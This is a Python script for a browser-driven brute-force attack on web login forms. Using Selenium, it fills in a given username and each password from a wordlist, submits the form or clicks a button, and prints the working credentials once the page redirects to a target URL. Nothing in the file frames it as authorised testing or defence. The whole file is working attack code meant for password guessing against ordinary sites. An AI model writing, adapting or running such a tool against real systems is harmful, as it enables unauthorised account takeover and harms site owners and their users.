#imports
from selenium import webdriver
from selenium.webdriver.common.by import By
import lib.presets
import time

#define brute function
def brute(args):
	#load preset
	if args.command == "preset":
		args=lib.presets.load_preset(args)

	#set browser
	if args.browser == "firefox":
		driver = webdriver.Firefox()
	else:
		driver = webdriver.Chrome()

	#make preset
	if args.command == "brute":
		if args.makepreset:
				lib.presets.make_preset(args.presetname,args.browser,str(args.url),args.userfield,args.passwordfield,args.formnumber,args.button,args.targeturl)

	#open wordlist
	with open(args.wordlist,"r") as wlist:

		#for each line
		for line in wlist:

			#load url to brute on
			driver.get(args.url)

			#get userfield by "name" css selector
			ufield=driver.find_element(By.CSS_SELECTOR, f'[name="{args.userfield}"]')
			
			#send username
			ufield.send_keys(args.username)

			#get passwordfield by "name" css selector
			pfield=driver.find_element(By.CSS_SELECTOR, f'[name="{args.passwordfield}"]')

			#send line
			pfield.send_keys(line.replace("\n",""))

			#check form or button mode
			if args.formnumber:
				
				#find and submit form
				forms=driver.find_elements(By.TAG_NAME,"form")
				form=forms[int(args.formnumber)]
				form.submit()
			else:
				
				#find and click button
				btn=driver.find_element(By.ID, args.button)
				btn.click()
				
			#wait
			time.sleep(1)

			#check success 
			if driver.current_url.startswith(args.targeturl):

				#print creeds
				print(f"{args.username} : {line}")
				break
